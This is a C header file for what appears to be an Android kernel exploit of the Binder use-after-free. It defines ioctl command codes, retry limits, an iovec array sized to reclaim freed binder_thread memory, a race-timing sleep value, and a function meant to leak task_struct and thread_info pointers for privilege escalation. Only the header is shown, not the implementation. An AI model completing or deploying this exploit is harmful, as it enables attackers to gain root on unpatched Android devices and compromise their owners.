#ifndef _BAD_BINDER_H_
#define _BAD_BINDER_H_

#include "kernel_defs.h"

// Maximum number of attempts to try triggering UAF
#define MAX_UAF_RETRY          0x3

// Binder ioctl cmd codes
#define BINDER_SET_MAX_THREADS 0x40046205
#define BINDER_THREAD_EXIT     0x40046208

// During the UAF, when the spinlock in thread->wait is aquired and subsequently released.
// this value will be written to the bottom 4 bytes of iovec_array[IOVEC_INDX_WQ].iov_len
#define UAF_SPINLOCK           0x10001 

// Number of elements neccessary for the iovec_array memory allocation  to *likely* 
// be the released binder_thread's memory, without overwriting the task_struct pointer.
#define BINDER_IOVEC_ARRAY_SZ  ((BINDER_THREAD_SZ - 0x8)/0x10)

// Beginning index in the iovec_array where the wait_queue_head_t structure overlaps
#define BINDER_IOVEC_INDX_WQ   (WAITQUEUE_BINDER_THREAD_OFFSET/0x10)

// Time in microseconds the child process sleeps in order to give the parent process 
// time to trigger the freeing/reallocation of the UAF memory
#define CHILD_SLEEP            0x33333

// Magic bytes written to userspace memory to test if exploit was triggered correctly
#define TEST_WRITE_MAGIC       0x1337C0DE

int32_t do_bad_binder(uint64_t* ppTaskStruct, uint64_t* ppThreadInfo);

#endif